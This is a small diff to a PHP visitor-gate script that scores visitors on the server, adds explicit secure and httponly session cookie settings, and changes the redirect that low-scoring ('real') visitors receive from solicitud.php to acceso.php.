@@ -1,6 +1,6 @@
 ﻿<?php
 require_once __DIR__ . '/_lib.php';
-session_start();
+session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
 
 // 1) Scoring server-side
 [$score, $reasons] = gate_compute_score();
@@ -8,7 +8,7 @@ session_start();
 // 2) Visitante real (score bajo) => redirect a /portal/
 if ($score < 8) {
     $_SESSION['gate_pass'] = time();
-    header('Location: /portal/solicitud.php', true, 302);
+    header('Location: /portal/acceso.php', true, 302);
     exit;
 }
 
